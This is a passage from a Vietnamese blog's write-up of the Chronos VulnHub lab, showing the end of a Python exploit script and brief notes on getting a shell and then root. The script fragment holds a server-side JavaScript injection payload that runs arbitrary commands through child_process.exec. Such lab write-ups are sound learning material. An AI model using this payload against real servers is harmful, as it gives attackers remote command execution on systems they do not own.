f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;&#123;cmd&#125;&#x27;);x&quot;)&#125;)</span><br><span class="line"></span><br><span class="line">### execute command</span><br><span class="line">requests.get(&#x27;http://localhost:8080&#x27;)</span><br><span class="line">print(&quot;Finished!&quot;)</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/08/10/chronos-vulnhub/8.png"><br>Nếu bạn hỏi là sao phải màu mè thế, sao đéo chèn cụ luôn payload vào EJS-Exploit, thì thú thật tôi làm thế rồi, nhưng đéo được &#x3D;)) Tôi chưa có câu trả lời cho vụ này, chắc là sẽ tìm hiểu thêm một chút nữa mới ra được lí do. Cơ mà tạm thế đã, lấy được shell của <em>imera</em> và…<br><img src="/2021/08/10/chronos-vulnhub/9.png"></p>
+<h3 id="imera-to-root"><a href="#imera-to-root" class="headerlink" title="imera to root"></a><em>imera</em> to <em>root</em></h3><p>Đoè moè &#x3D;)) leo root ez vãi!<br><img src="/2021/08/10/chronos-vulnhub/10.png"><br>Áp dụng đúng công thức mà làm, không vẽ vời…<br><img src="/2021/08/10/chronos-vulnhub/11.png"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
+              <a href="/tags/write-up/" rel="tag"># write up</a>
+              <a href="/tags/easy/" rel="tag"># easy</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/08/03/how-i-hacked-the-first-website/" rel="prev" title="[Talk] Tôi đã &#39;hách&#39; trang web đầu tiên trong đời mình như thế nào?">
+                  <i class="fa fa-angle-left"></i> [Talk] Tôi đã 'hách' trang web đầu tiên trong đời mình như thế nào?
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/09/28/how-i-fail-oscp-exam/" rel="next" title="[Talk] Tôi đã tạch OSCP như thế nào?">
+                  [Talk] Tôi đã tạch OSCP như thế nào? <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">minhnq22</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
